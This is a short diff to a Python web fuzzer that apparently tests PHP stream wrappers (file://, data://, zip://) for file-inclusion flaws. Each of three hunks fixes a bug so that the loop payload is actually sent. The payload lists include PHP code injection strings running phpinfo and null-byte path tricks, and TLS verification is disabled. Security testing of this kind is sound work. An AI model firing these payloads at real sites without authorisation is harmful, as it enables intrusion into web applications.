@@ -125,7 +125,7 @@ def wrapper_ftp_fuzz(url, hcode=(), hsize=(), htext=(), cookie=None, redirect=Fa
 def wrapper_file_fuzz(url, payload, hcode=(), hsize=(), htext=(), cookie=None, redirect=False):
     file_payloads = [f"file://{payload}", f"file://{payload}%00"]
     for p in file_payloads:
-        resp = requests.get(f"{url}{payload}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+        resp = requests.get(f"{url}{p}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
         if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
             print(common.good_code(resp.status_code, f"{url}{p} [code:{resp.status_code} size:{len(resp.content)}]"))
         # urlencode
@@ -152,7 +152,7 @@ def wrapper_data_fuzz(url, payload, hcode=(), hsize=(), htext=(), cookie=None, r
                      f"data://text/plain,<?php echo base64_encode(phpinfo()); ?>%00",
                      f"data://text/plain,<?php phpinfo(); ?>%00"]
     for p in data_payloads:
-        resp = requests.get(f"{url}{payload}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+        resp = requests.get(f"{url}{p}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
         if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
             print(common.good_code(resp.status_code, f"{p} [code:{resp.status_code} size:{len(resp.content)}]"))
         # urlencode
@@ -179,7 +179,7 @@ def wrapper_compress_fuzz(url, payload, hcode=(), hsize=(), htext=(), cookie=Non
                          f"zip://test.zip#/tmp/test.php",
                          f"zip://test.zip#/tmp/test.php%00",]
     for p in compress_payloads:
-        resp = requests.get(f"{url}{payload}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+        resp = requests.get(f"{url}{p}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
         if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
             print(common.good_code(resp.status_code, f"{p} [code:{resp.status_code} size:{len(resp.content)}]"))
         # urlencode
